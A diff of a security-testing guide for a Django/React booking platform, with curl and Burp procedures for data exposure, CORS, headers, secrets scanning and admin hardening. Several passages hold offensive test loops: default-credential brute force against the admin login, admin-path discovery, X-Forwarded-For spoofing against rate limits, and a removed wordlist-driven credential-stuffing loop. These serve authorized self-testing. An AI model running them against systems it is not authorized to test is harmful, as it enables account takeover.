+**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)  
+**Tools:** curl, jq  
+
+**Procedure:**
 ```bash
-# List all users — must not be accessible to regular users
-curl -H "Authorization: Bearer <regular_user_token>" \
-  https://your-backend.com/api/users/
+GUEST_TOKEN="<regular user token>"
 
-# Pass: 403 Forbidden
+# Test 1 — User list must be admin-only
+curl -s -H "Authorization: Bearer $GUEST_TOKEN" \
+  https://your-backend.com/api/users/ | jq 'if type=="array" then "FAIL: user list returned" else .error end'
 
-# Get another user's profile — verify minimal data is returned
-curl -H "Authorization: Bearer <user_a_token>" \
-  https://your-backend.com/api/users/<user_b_id>/
+# Test 2 — Another user's profile — check which fields are returned
+OTHER_USER_ID="<another user's UUID>"
+curl -s -H "Authorization: Bearer $GUEST_TOKEN" \
+  https://your-backend.com/api/users/$OTHER_USER_ID/ \
+  | jq 'keys'
 
-# Pass: Returns only public fields (name, avatar, host status).
-# Must NOT include: email, phone, password hash, tokens, internal IDs.
+# Fields that MUST NOT appear: email, phone, password, tokens, is_staff, internal_id
+# Fields that are OK: firstName, lastName, avatar, isHost, createdAt (public profile only)
+
+# Test 3 — Booking list must show only own bookings
+curl -s -H "Authorization: Bearer $GUEST_TOKEN" \
+  https://your-backend.com/api/bookings/ \
+  | jq '[.[].guestId] | unique'
+# All IDs must equal the logged-in user's ID
+
+# Test 4 — Listing response must not expose host's private details
+curl -s https://your-backend.com/api/listings/1/ \
+  | jq '.host | keys'
+# Must not include: email, phone, passwordHash, tokens, internalId
 ```
 
 ---
 
-### 8.2 Error Message Leakage
+### TEST-DATA-02 — Error Message Leakage
 
+**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)  
+**Tools:** curl  
+
+**Procedure:**
 ```bash
-# Send a malformed request to trigger a server error
-curl -X POST https://your-backend.com/api/bookings/ \
+# Test 1 — Malformed JSON
+curl -s -X POST https://your-backend.com/api/bookings/ \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
-  -d 'INVALID{JSON'
+  -d 'NOT_VALID_JSON' | jq .
 
-# Pass: Generic error message returned.
-# Must NOT include: stack trace, file paths, DB table names, Django version, SQL query.
+# Test 2 — Non-existent endpoint
+curl -s https://your-backend.com/api/nonexistent-xyz/ | jq .
+
+# Test 3 — Invalid data types
+curl -s -X POST https://your-backend.com/api/bookings/ \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"listing":"not_an_id","start_date":"not_a_date"}' | jq .
+
+# Pass: Responses contain generic messages only.
+# Must NOT contain: stack trace, file paths (/home/user/app/...), SQL query text,
+# Django version, PostgreSQL error codes, internal variable names
 ```
 
 ---
 
-### 8.3 DEBUG Mode in Production
+### TEST-DATA-03 — DEBUG Mode in Production
 
+**CWE:** CWE-215 (Insertion of Sensitive Information into Debugging Code)  
+**Tools:** curl, browser  
+
+**Procedure:**
 ```bash
-curl https://your-backend.com/api/nonexistent-endpoint-xyz/
+# Test 1 — Trigger a 500 error
+curl -s https://your-backend.com/api/listings/99999999/ | jq .
 
-# Pass: Generic 404 response — NOT the Django yellow debug page
-# Also verify in settings.py: DEBUG = False (via environment variable)
+# Test 2 — Navigate to a non-existent admin URL in browser
+# https://your-backend.com/admin/listings/listing/99999999/change/
+
+# Test 3 — Confirm DEBUG setting
+curl -s https://your-backend.com/api/nonexistent/ \
+  | grep -i "django\|traceback\|settings\|debug"
+
+# Pass: All return a clean JSON error. The Django debug page (yellow page) must NEVER appear.
+# Verify in settings: DEBUG = env.bool('DEBUG', default=False)
 ```
-
----
-
-### 8.4 Sensitive Data in Logs
-
-```bash
-# After a login request, check server logs
-tail -f /var/log/app/access.log
-
-# Pass: Password is NOT logged. Card numbers are NOT logged.
-# Request bodies containing sensitive fields should be redacted in logs.
-```
-
----
-
-### 8.5 Booking ID Enumeration
-
-1. Complete a booking and note the booking ID format.
-2. If IDs are sequential integers, an attacker can enumerate all bookings.
-
-**Pass criteria:** Booking IDs are UUIDs or opaque references. The confirmation URL contains no ID at all (it's passed via router state, not the URL).
 
 ---
 
 ## 9. Transport & Header Security
 
-### 9.1 Security Headers Check
+---
 
+### TEST-TRANS-01 — Security Headers
+
+**CWE:** CWE-693 (Protection Mechanism Failure)  
+**Tools:** curl, securityheaders.com, Mozilla Observatory  
+
+**Procedure:**
 ```bash
-curl -I https://your-backend.com/api/auth/login/
+curl -I https://your-backend.com/api/auth/login/ 2>&1 | grep -Ei \
+  "x-content-type|x-frame|strict-transport|referrer-policy|content-security|permissions-policy"
 
-# Required headers:
+# Required headers and expected values:
 # X-Content-Type-Options: nosniff
 # X-Frame-Options: DENY
 # Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
 # Referrer-Policy: strict-origin-when-cross-origin
-# Content-Security-Policy: (present and restrictive)
+# Content-Security-Policy: (present — review for unsafe-inline usage)
 # Permissions-Policy: camera=(), microphone=(), geolocation=(self)
 ```
 
-Use [securityheaders.com](https://securityheaders.com) or [Mozilla Observatory](https://observatory.mozilla.org) for a graded report (target: **A or A+**).
+**Grading (automated):**
+- Navigate to https://securityheaders.com → enter your backend URL → target grade: **A or A+**
+- Navigate to https://observatory.mozilla.org → target score: **85+**
 
 ---
 
-### 9.2 CORS Policy
+### TEST-TRANS-02 — CORS Policy
 
+**CWE:** CWE-346 (Origin Validation Error)  
+**Tools:** curl  
+
+**Procedure:**
 ```bash
-# Verify unauthorized origin is rejected
-curl -I \
-  -H "Origin: https://attacker.com" \
+# Test 1 — Untrusted origin must be rejected
+curl -v \
+  -H "Origin: https://attacker.example.com" \
   -H "Access-Control-Request-Method: POST" \
   -X OPTIONS \
-  https://your-backend.com/api/auth/login/
+  https://your-backend.com/api/auth/login/ 2>&1 \
+  | grep -i "access-control-allow-origin"
 
-# Pass: Access-Control-Allow-Origin does NOT include attacker.com
+# Pass: Must not include attacker.example.com or *
 
-# Verify wildcard is not used
-curl -I https://your-backend.com/api/auth/login/ | grep -i "access-control-allow-origin"
-# Pass: Must not be "*" for endpoints that accept credentials
+# Test 2 — Wildcard check
+curl -I https://your-backend.com/api/listings/ \
+  | grep -i "access-control-allow-origin"
+# Pass: Must not be "*" for credentialed endpoints
+
+# Test 3 — Legitimate frontend origin must be allowed
+curl -v \
+  -H "Origin: https://realestate-booking-platform.vercel.app" \
+  -H "Access-Control-Request-Method: POST" \
+  -X OPTIONS \
+  https://your-backend.com/api/auth/login/ 2>&1 \
+  | grep -i "access-control-allow-origin"
+# Pass: Returns your frontend domain exactly
 ```
 
 ---
 
-### 9.3 HTTPS Enforcement
+### TEST-TRANS-03 — HTTPS Enforcement
 
+**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)  
+**Tools:** curl, browser  
+
+**Procedure:**
 ```bash
-# Attempt HTTP — must redirect to HTTPS
-curl -I http://your-backend.com/api/auth/login/
-# Pass: 301 or 302 redirect to https://
+# HTTP must redirect to HTTPS
+curl -v http://your-backend.com/api/auth/login/ 2>&1 | grep -E "< HTTP|Location:"
 
-# Check for mixed content in the frontend
-# Chrome DevTools → Console — should show no "Mixed Content" warnings
+# Pass: HTTP 301 or 302 redirect to https://
+
+# Test mixed content in frontend (Chrome DevTools)
+# DevTools → Console → filter "Mixed Content"
+# Pass: Zero warnings
+
+# Verify TLS version (TLS 1.2 minimum, TLS 1.3 preferred)
+openssl s_client -connect your-backend.com:443 2>&1 | grep "Protocol"
+# Pass: TLSv1.2 or TLSv1.3
 ```
 
 ---
 
-### 9.4 X-Forwarded-For / IP Spoofing
+### TEST-TRANS-04 — X-Forwarded-For Spoofing
 
+**CWE:** CWE-348 (Use of Less Trusted Source)  
+**Tools:** curl  
+
+**Procedure:**
 ```bash
-# If rate limiting is IP-based, ensure spoofed headers don't bypass it
-for i in {1..30}; do
-  curl -s -o /dev/null -w "%{http_code}\n" \
+# Send 20 requests, each with a different spoofed IP
+for i in $(seq 1 20); do
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
     -X POST https://your-backend.com/api/auth/login/ \
-    -H "X-Forwarded-For: 1.2.3.$i" \
+    -H "X-Forwarded-For: 10.0.0.$i" \
+    -H "X-Real-IP: 10.0.0.$i" \
     -H "Content-Type: application/json" \
-    -d '{"username":"test@example.com","password":"wrong"}'
+    -d '{"username":"test@example.com","password":"wrong"}')
+  echo "IP 10.0.0.$i: HTTP $CODE"
+  [ "$CODE" = "429" ] && echo "Rate limit triggered" && break
 done
 
-# Pass: Rate limiting fires regardless of X-Forwarded-For value
-# (Django should only trust this header from known proxy IPs via TRUSTED_PROXIES)
+# Pass: Rate limiting fires based on real IP (from trusted proxy), not X-Forwarded-For value.
+# Django setting: USE_X_FORWARDED_HOST = False unless behind a known, trusted proxy.
 ```
 
 ---
 
 ## 10. Infrastructure & Configuration
 
-### 10.1 Environment Variables — Nothing Hardcoded
+---
 
+### TEST-INFRA-01 — Hardcoded Secrets Scan
+
+**CWE:** CWE-798  
+**Tools:** grep, git, Gitleaks  
+
+**Procedure:**
 ```bash
-# Check for hardcoded secrets in backend code
-grep -rn "sk_live_\|pk_live_\|SECRET_KEY\s*=\s*['\"]" backend/ --include="*.py"
-grep -rn "password\s*=\s*['\"]" backend/ --include="*.py" | grep -v "test\|example\|placeholder"
+# Static scan
+grep -rEn \
+  "sk_live_|pk_live_|whsec_|SECRET_KEY\s*=\s*['\"][^e]|password\s*=\s*['\"][a-zA-Z]" \
+  backend/ --include="*.py" --include="*.env" --include="*.yaml"
 
-# Check git history for accidentally committed secrets
-git log --all --oneline | head -20
-git grep -i "secret_key\|api_key\|password" $(git rev-list --all)
+# Full git history scan with Gitleaks
+docker run --rm -v $(pwd):/repo \
+  zricethezav/gitleaks:latest detect \
+  --source /repo --report-format json --report-path /repo/gitleaks-report.json
 
-# Pass: No hardcoded secrets in code or git history
+cat gitleaks-report.json | jq '.[] | {file, line, secret: .Secret[:20]}'
+
+# Pass: Zero matches in code. Zero findings in git history.
 ```
 
 ---
 
-### 10.2 Dependency Vulnerabilities
+### TEST-INFRA-02 — Dependency CVEs
 
+**Tools:** safety, pip-audit, npm audit, Trivy  
+
+**Procedure:**
 ```bash
-# Backend
-pip install safety
-safety check -r requirements.txt
+# Backend Python dependencies
+pip install safety pip-audit
+safety check -r requirements.txt --output=json > safety-report.json
+pip-audit -r requirements.txt --format=json > pip-audit-report.json
 
-# Frontend
-cd frontend && npm audit
-npm audit --audit-level=high  # fail on high/critical only
+cat safety-report.json | jq '.vulnerabilities[] | {package, advisory, severity}'
+cat pip-audit-report.json | jq '.dependencies[] | select(.vulns | length > 0)'
+
+# Frontend Node dependencies
+cd frontend
+npm audit --json > npm-audit.json
+cat npm-audit.json | jq '.vulnerabilities | to_entries[] | select(.value.severity=="critical" or .value.severity=="high") | {name: .key, severity: .value.severity}'
+
+# Docker image
+docker build -t homekonet-backend ./backend
+trivy image homekonet-backend --severity HIGH,CRITICAL --format json > trivy-report.json
+cat trivy-report.json | jq '.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL") | {PkgName, Title, VulnerabilityID}'
+```
+
+**Sources:** [Safety](https://pyup.io/safety/), [pip-audit](https://github.com/pypa/pip-audit), [Trivy](https://github.com/aquasecurity/trivy)
+
+---
+
+### TEST-INFRA-03 — Django Admin Hardening
+
+**Tools:** Browser, curl  
+
+**Procedure:**
+```bash
+# Test 1 — Discover admin path
+ADMIN_PATHS=("/admin/" "/django-admin/" "/backend/admin/" "/staff/" "/manage/")
+for PATH in "${ADMIN_PATHS[@]}"; do
+  echo -n "$PATH: "
+  curl -s -o /dev/null -w "%{http_code}\n" "https://your-backend.com$PATH"
+done
+
+# Test 2 — Brute force common credentials
+CREDS=("admin:admin" "admin:password" "admin:12345" "root:root" "superuser:admin")
+for CRED in "${CREDS[@]}"; do
+  USER=$(echo $CRED | cut -d: -f1)
+  PASS=$(echo $CRED | cut -d: -f2)
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
+    -X POST https://your-backend.com/admin/login/ \
+    -d "username=$USER&password=$PASS")
+  echo "$CRED: HTTP $CODE"
+done
+
+# Pass: /admin/ returns 404 (custom URL used) or 302 to login.
+# Default credential pairs all return 200 with an error (not a successful redirect to /admin/).
 ```
 
 ---
 
-### 10.3 Django Admin Hardening
+### TEST-INFRA-04 — Database Not Publicly Exposed
 
-1. Navigate to `/admin/` in a browser (if Django admin is enabled).
-2. Attempt common paths: `/admin/`, `/django-admin/`, `/backend/admin/`.
-3. Attempt login with `admin:admin`, `admin:password`, `root:root`.
+**Tools:** nc (netcat)  
 
-**Pass criteria:**
-- Admin panel is either hidden behind a custom URL or completely disabled.
-- Brute force protection on the admin login.
-- Admin is only accessible from trusted IP ranges (if possible).
-
----
-
-### 10.4 PostgreSQL Exposure
-
+**Procedure:**
 ```bash
-# Verify the database is not directly accessible from the internet
-nc -zv your-db-host.example.com 5432
-# Pass: Connection refused or timed out from outside the private network
+DB_HOST="your-db-host.example.com"
+
+# Test PostgreSQL port
+nc -zv $DB_HOST 5432 2>&1
+# Pass: "Connection refused" or timeout — database unreachable from the internet
+
+# Test Redis port (if used)
+nc -zv $DB_HOST 6379 2>&1
+
+# Verify DATABASE_URL is not in public settings
+grep -rn "DATABASE_URL\|postgres://" backend/ --include="*.py" | grep -v "env(\|os.environ"
 ```
 
 ---
 
 ## 11. Automated Scanning
 
-### 11.1 Backend — Static Analysis
+### 11.1 Backend — Python/Django
 
 ```bash
-# Bandit — Python security linter
+# Bandit (static security linter for Python)
 pip install bandit
-bandit -r backend/ -ll -ii
-# -ll = medium+ severity, -ii = medium+ confidence
-# Review and remediate all HIGH findings
+bandit -r backend/ -ll -ii -f json -o bandit-report.json
+cat bandit-report.json | jq '.results[] | select(.issue_severity=="HIGH") | {filename, test_id, issue_text}'
 
-# Safety — known CVEs in dependencies
+# Safety (known CVEs in pip packages)
 pip install safety
-safety check -r requirements.txt --output=json > safety-report.json
+safety check -r requirements.txt
 
-# Semgrep — semantic code patterns for Django
+# Semgrep (semantic code analysis)
 pip install semgrep
 semgrep --config=p/django backend/
 semgrep --config=p/python backend/
-semgrep --config=p/secrets backend/
+semgrep --config=p/secrets backend/    # find hardcoded API keys / passwords
 ```
 
----
-
-### 11.2 Frontend — Static Analysis
+### 11.2 Frontend — JavaScript/TypeScript
 
 ```bash
 cd frontend
 
 # npm audit
 npm audit
-npm audit --audit-level=moderate --json > npm-audit.json
+npm audit --audit-level=high --json > npm-audit.json
 
-# Semgrep for React/TypeScript
+# Semgrep
 semgrep --config=p/react src/
-semgrep --config=p/javascript src/
 semgrep --config=p/typescript src/
 
 # ESLint security plugin
-npm install --save-dev eslint-plugin-security
-# Add to .eslintrc: "plugins": ["security"], "extends": ["plugin:security/recommended"]
+npm install --save-dev eslint-plugin-security eslint-plugin-no-unsanitized
+# Add to .eslintrc.json:
+# "plugins": ["security", "no-unsanitized"],
+# "extends": ["plugin:security/recommended", "plugin:no-unsanitized/DOM"]
 npx eslint src/ --ext .ts,.tsx
 ```
-
----
 
 ### 11.3 DAST — OWASP ZAP
 
 ```bash
-# Baseline scan (passive — does not attack)
-docker run -t owasp/zap2docker-stable zap-baseline.py \
-  -t https://your-frontend.com \
-  -r zap-baseline-report.html
+# Pull the image once
+docker pull owasp/zap2docker-stable
 
-# Full active scan (attacks the target — use ONLY in a staging environment)
-docker run -t owasp/zap2docker-stable zap-full-scan.py \
+# Passive baseline scan (non-destructive — safe on production)
+docker run --rm -v $(pwd):/zap/wrk owasp/zap2docker-stable \
+  zap-baseline.py \
+  -t https://your-frontend.com \
+  -r /zap/wrk/zap-baseline-report.html \
+  -J /zap/wrk/zap-baseline-report.json
+
+# Active scan (attacks — staging environment ONLY)
+docker run --rm -v $(pwd):/zap/wrk owasp/zap2docker-stable \
+  zap-full-scan.py \
   -t https://your-staging-backend.com \
-  -r zap-full-report.html \
-  -z "-config api.disablekey=true"
+  -r /zap/wrk/zap-full-report.html
 
 # API scan using OpenAPI spec
-docker run -t owasp/zap2docker-stable zap-api-scan.py \
+docker run --rm -v $(pwd):/zap/wrk owasp/zap2docker-stable \
+  zap-api-scan.py \
   -t https://your-backend.com/api/schema/ \
   -f openapi \
-  -r zap-api-report.html
+  -r /zap/wrk/zap-api-report.html
+
+# Review all MEDIUM and HIGH alerts before deploying
+cat zap-baseline-report.json | jq '.site[].alerts[] | select(.riskdesc | startswith("High") or startswith("Medium")) | {name, riskdesc, solution}'
 ```
 
-**ZAP GUI approach:**
+**ZAP GUI procedure:**
 1. Launch ZAP → Automated Scan → enter target URL.
 2. Spider to discover endpoints.
-3. Active Scan → review Alerts tab.
-4. Remediate all **High** and **Medium** findings before going to production.
+3. Active Scan → wait for completion.
+4. Alerts tab → filter by Risk → address all High/Medium findings.
 
----
+**Source:** https://www.zaproxy.org/docs/
 
-### 11.4 Container Scanning
+### 11.4 Container Scanning (Trivy)
 
 ```bash
-# Trivy — scan Docker images for OS and library CVEs
-brew install aquasecurity/trivy/trivy  # or: apt-get install trivy
+# Install
+brew install aquasecurity/trivy/trivy  # macOS
+# or: apt-get install trivy            # Debian/Ubuntu
 
-docker build -t homekonet-backend ./backend
-trivy image homekonet-backend --severity HIGH,CRITICAL
+# Scan backend image
+docker build -t homekonet-backend:scan ./backend
+trivy image homekonet-backend:scan \
+  --severity HIGH,CRITICAL \
+  --format table
 
-docker build -t homekonet-frontend ./frontend
-trivy image homekonet-frontend --severity HIGH,CRITICAL
+# Scan frontend image
+docker build -t homekonet-frontend:scan ./frontend
+trivy image homekonet-frontend:scan --severity HIGH,CRITICAL
 
-# Pass: No CRITICAL CVEs; HIGH CVEs documented and tracked
+# Scan filesystem (without building image)
+trivy fs --severity HIGH,CRITICAL .
+
+# Source: https://aquasecurity.github.io/trivy/
 ```
 
 ---
 
 ## 12. Manual Penetration Testing Procedures
 
-### 12.1 Burp Suite Setup
+### 12.1 Burp Suite Setup (Required for intercept-based tests)
 
-1. Install [Burp Suite Community](https://portswigger.net/burp/communitydownload).
-2. Configure browser proxy to `127.0.0.1:8080`.
-3. Install Burp CA certificate in the browser to intercept HTTPS.
-4. Navigate the app and let Burp build the site map.
-5. Use the **Repeater** to replay and modify individual requests.
-6. Use **Intruder** to fuzz parameters.
+**Install:** https://portswigger.net/burp/communitydownload
 
----
-
-### 12.2 Auth Bypass Checklist (Burp Repeater)
-
-For each protected API endpoint:
-- [ ] Remove `Authorization` header entirely → expect 401
-- [ ] Send a valid token for the wrong user → expect 403 or 404
-- [ ] Send an expired token → expect 401
-- [ ] Send a malformed token (`Bearer AAAA`) → expect 401
-- [ ] Change `user_id` in the JWT payload (without re-signing) → expect 401
-- [ ] Use a guest token on a host-only endpoint → expect 403
-- [ ] Use a host token on an admin-only endpoint → expect 403
-
----
-
-### 12.3 Credential Stuffing Simulation
-
-```bash
-# Install a wordlist (e.g., rockyou.txt top 1000 passwords)
-# Test against login endpoint with a real username
-
-while IFS= read -r pass; do
-  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X POST https://your-backend.com/api/auth/login/ \
-    -H "Content-Type: application/json" \
-    -d "{\"username\":\"target@example.com\",\"password\":\"$pass\"}")
-  echo "$CODE $pass"
-  if [ "$CODE" = "429" ]; then
-    echo "Rate limit triggered after $(grep -c . <<< ".")" && break
-  fi
-done < top1000-passwords.txt
-
-# Pass: 429 triggers well before the list is exhausted (target: < 10 attempts)
+```
+1. Launch Burp Suite Community.
+2. Proxy tab → Options → confirm proxy listener: 127.0.0.1:8080.
+3. Browser: set HTTP proxy to 127.0.0.1:8080.
+4. Burp → Proxy → CA Certificate → download and install in browser trust store
+   (Chrome: Settings → Privacy → Manage certificates → Authorities → Import).
+5. Visit https://your-backend.com — traffic should appear in Proxy → HTTP History.
 ```
 
+**Repeater workflow (for IDOR / auth bypass):**
+1. Find a request in HTTP History → right-click → Send to Repeater.
+2. In Repeater: modify headers (change auth token, modify IDs).
+3. Click Send → inspect response code and body.
+
+**Intruder workflow (for brute force / fuzzing):**
+1. Right-click a request → Send to Intruder.
+2. Highlight the target parameter → Add § markers.
+3. Payloads tab → load a wordlist.
+4. Start Attack → sort by response length to spot anomalies.
+
 ---
 
-### 12.4 Full OWASP Top 10 Checklist
+### 12.2 Full Auth Bypass Checklist (Burp Repeater)
 
-| # | Category | Test Method | Status |
+For every protected API endpoint, run all of these in Repeater:
+
+| Modification | Expected result |
+|---|---|
+| Remove `Authorization` header entirely | HTTP 401 |
+| Send a valid token for the wrong user | HTTP 403 or 404 |
+| Send an expired access token | HTTP 401 |
+| Send a malformed token (`Bearer AAAA`) | HTTP 401 |
+| Modify JWT payload without re-signing | HTTP 401 |
+| Use a guest token on host-only endpoint | HTTP 403 |
+| Use a host token on admin-only endpoint | HTTP 403 |
+| Use HTTP instead of HTTPS (token in plaintext) | HTTP 301 redirect |
+
+---
+
+### 12.3 OWASP Top 10 (2021) Full Checklist
+
+| # | Category | Tests in This Document | Status |
 |---|---|---|---|
-| A01 | Broken Access Control | IDOR tests (§3.1–3.4), privilege escalation | ☐ |
-| A02 | Cryptographic Failures | Token storage (§2.2), HTTPS (§9.3), no plaintext passwords | ☐ |
-| A03 | Injection | SQL injection (§4.1), XSS (§4.2–4.3) | ☐ |
-| A04 | Insecure Design | Business logic tests (§5), double-booking (§5.1) | ☐ |
-| A05 | Security Misconfiguration | DEBUG mode (§8.3), headers (§9.1), admin hardening (§10.3) | ☐ |
-| A06 | Vulnerable Components | `npm audit`, `safety check`, `trivy` (§11.2–11.4) | ☐ |
-| A07 | Auth Failures | Brute force (§2.5), token expiry (§2.3), logout (§2.6) | ☐ |
-| A08 | Software/Data Integrity | Webhook signature (§6.4), dependency lock files | ☐ |
-| A09 | Security Logging | Log leakage (§8.4), audit trail for bookings and approvals | ☐ |
-| A10 | SSRF | Server-side request forgery (§4.6) | ☐ |
+| A01 | Broken Access Control | TEST-AUTHZ-01 through TEST-AUTHZ-04, TEST-BIZ-01 | ☐ |
+| A02 | Cryptographic Failures | TEST-AUTH-02, TEST-AUTH-04, TEST-TRANS-03, TEST-PAY-01 | ☐ |
+| A03 | Injection | TEST-INPUT-01 (SQL), TEST-INPUT-02/03 (XSS), TEST-INPUT-05 (Path Traversal) | ☐ |
+| A04 | Insecure Design | TEST-BIZ-01 through TEST-BIZ-03, TEST-PAY-02/05 | ☐ |
+| A05 | Security Misconfiguration | TEST-DATA-03 (DEBUG), TEST-TRANS-01 (headers), TEST-INFRA-03 (admin) | ☐ |
+| A06 | Vulnerable Components | TEST-INFRA-02 (CVEs) | ☐ |
+| A07 | Identification & Auth Failures | TEST-AUTH-01 through TEST-AUTH-07 | ☐ |
+| A08 | Software & Data Integrity | TEST-PAY-03 (webhook HMAC), TEST-INFRA-01 (secrets) | ☐ |
+| A09 | Logging & Monitoring Failures | TEST-DATA-02 (error leakage), TEST-DATA-01 (PII exposure) | ☐ |
+| A10 | SSRF | TEST-INPUT-06 | ☐ |
+
+**Source:** https://owasp.org/Top10/
 
 ---
 
 ## 13. Security Headers — Django Configuration
 
-Add to `backend/settings.py` for production:
-
 ```python
-# Core security switches
+# backend/settings.py (production values)
+
 DEBUG = env.bool('DEBUG', default=False)
-SECURE_SSL_REDIRECT = not DEBUG                          # Redirect HTTP → HTTPS
+
+# HTTPS enforcement
+SECURE_SSL_REDIRECT = not DEBUG
 SECURE_HSTS_SECONDS = 31536000
 SECURE_HSTS_INCLUDE_SUBDOMAINS = True
 SECURE_HSTS_PRELOAD = True
+
+# Header flags
 SECURE_BROWSER_XSS_FILTER = True
 SECURE_CONTENT_TYPE_NOSNIFF = True
 X_FRAME_OPTIONS = 'DENY'
+
+# Cookie security
 SESSION_COOKIE_SECURE = True
 SESSION_COOKIE_HTTPONLY = True
+SESSION_COOKIE_SAMESITE = 'Strict'
 CSRF_COOKIE_SECURE = True
 CSRF_COOKIE_HTTPONLY = True
+CSRF_COOKIE_SAMESITE = 'Strict'
+
+# File upload limits
+DATA_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024   # 10 MB
+FILE_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024   # 10 MB
 
 # Content Security Policy (pip install django-csp)
+# https://django-csp.readthedocs.io/
 MIDDLEWARE = [
     'csp.middleware.CSPMiddleware',
     'django.middleware.security.SecurityMiddleware',
-    # ... rest of your middleware
+    # ... rest
 ]
 
 CSP_DEFAULT_SRC = ("'self'",)
@@ -1056,17 +1805,18 @@ CSP_FRAME_SRC   = ("'self'", "https://js.stripe.com")
 CSP_IMG_SRC     = ("'self'", "data:", "https:", "blob:")
 CSP_CONNECT_SRC = ("'self'", "https://api.stripe.com", "wss:")
 CSP_FONT_SRC    = ("'self'", "data:")
-CSP_STYLE_SRC   = ("'self'", "'unsafe-inline'")   # narrow this when you have a hash strategy
+CSP_STYLE_SRC   = ("'self'", "'unsafe-inline'")
 CSP_OBJECT_SRC  = ("'none'",)
 CSP_BASE_URI    = ("'self'",)
 CSP_REPORT_URI  = "/csp-report/"
 
-# Permissions Policy
+# Permissions Policy (pip install django-permissions-policy)
 PERMISSIONS_POLICY = {
     "camera": [],
     "microphone": [],
     "geolocation": ["self"],
     "payment": ["self", "https://js.stripe.com"],
+    "usb": [],
 }
 ```
 
@@ -1085,92 +1835,87 @@ on:
   pull_request:
     branches: [main]
   schedule:
-    - cron: '0 3 * * 1'   # Weekly Monday 3am UTC — catch new CVEs
+    - cron: '0 3 * * 1'   # Weekly Monday 3am UTC — catches new CVEs in existing deps
 
 jobs:
   backend-security:
-    name: Backend — Static Analysis
+    name: Backend Static Analysis
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
 
-      - name: Set up Python 3.11
-        uses: actions/setup-python@v5
+      - uses: actions/setup-python@v5
         with:
           python-version: '3.11'
 
-      - name: Install dependencies
-        run: |
-          pip install -r requirements.txt
-          pip install bandit safety semgrep
+      - run: pip install -r requirements.txt bandit safety semgrep pip-audit
 
-      - name: Bandit static analysis
-        run: bandit -r backend/ -ll -ii --exit-zero -f json -o bandit-report.json
+      - name: Bandit
+        run: bandit -r backend/ -ll -ii -f json -o bandit-report.json --exit-zero
 
-      - name: Safety — dependency CVEs
+      - name: pip-audit
+        run: pip-audit -r requirements.txt
+
+      - name: Safety
         run: safety check -r requirements.txt
 
-      - name: Semgrep — Django patterns
+      - name: Semgrep
         run: semgrep --config=p/django --config=p/secrets backend/ --error
 
-      - name: Upload bandit report
-        uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@v4
         if: always()
         with:
           name: bandit-report
           path: bandit-report.json
 
   frontend-security:
-    name: Frontend — Static Analysis
+    name: Frontend Static Analysis
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
 
-      - name: Set up Node 20
-        uses: actions/setup-node@v4
+      - uses: actions/setup-node@v4
         with:
           node-version: '20'
           cache: 'npm'
           cache-dependency-path: frontend/package-lock.json
 
-      - name: Install dependencies
-        run: cd frontend && npm ci
+      - run: cd frontend && npm ci
 
-      - name: npm audit (high + critical)
+      - name: npm audit
         run: cd frontend && npm audit --audit-level=high
 
-      - name: Semgrep — React/TypeScript
+      - name: Semgrep React/TS
         run: semgrep --config=p/react --config=p/typescript frontend/src/ --error
 
-  docker-scan:
-    name: Container Vulnerability Scan
+  secrets-scan:
+    name: Secret Detection (Gitleaks)
     runs-on: ubuntu-latest
-    needs: [backend-security, frontend-security]
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - uses: gitleaks/gitleaks-action@v2
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  container-scan:
+    name: Container CVE Scan (Trivy)
+    runs-on: ubuntu-latest
+    needs: [backend-security]
     steps:
       - uses: actions/checkout@v4
 
       - name: Build backend image
         run: docker build -t homekonet-backend:ci ./backend
 
-      - name: Trivy — backend image
-        uses: aquasecurity/trivy-action@master
+      - uses: aquasecurity/trivy-action@master
         with:
           image-ref: homekonet-backend:ci
           severity: HIGH,CRITICAL
           exit-code: '1'
-
-  secrets-scan:
-    name: Secret Detection
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0   # full history for git-secrets
-
-      - name: Gitleaks — scan for secrets in history
-        uses: gitleaks/gitleaks-action@v2
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          format: 'table'
 ```
 
 ---
@@ -1181,15 +1926,13 @@ Create `.pre-commit-config.yaml` in the project root:
 
 ```yaml
 repos:
-  # Python security
   - repo: https://github.com/PyCQA/bandit
     rev: 1.7.8
     hooks:
       - id: bandit
-        args: ["-ll", "-ii", "--skip=B101"]   # B101 = assert statements (OK in tests)
+        args: ["-ll", "-ii", "--skip=B101"]
         files: ^backend/
 
-  # Secret detection
   - repo: https://github.com/Yelp/detect-secrets
     rev: v1.4.0
     hooks:
@@ -1197,13 +1940,11 @@ repos:
         args: ['--baseline', '.secrets.baseline']
         exclude: package-lock.json
 
-  # Gitleaks — broader secret patterns
   - repo: https://github.com/gitleaks/gitleaks
     rev: v8.18.1
     hooks:
       - id: gitleaks
 
-  # General hygiene
   - repo: https://github.com/pre-commit/pre-commit-hooks
     rev: v4.5.0
     hooks:
@@ -1214,76 +1955,83 @@ repos:
         args: ['--branch', 'main']
 ```
 
-**Install:**
 ```bash
+# One-time setup
 pip install pre-commit
 pre-commit install
-pre-commit run --all-files   # run once on all files to create baseline
+detect-secrets scan > .secrets.baseline   # create initial baseline
+pre-commit run --all-files                # validate entire codebase once
 ```
 
 ---
 
 ## 16. Incident Response Checklist
 
-If a security incident is suspected:
-
 ### Immediate (0–1 hour)
 
-- [ ] **Rotate** `DJANGO_SECRET_KEY` (invalidates all sessions and CSRF tokens).
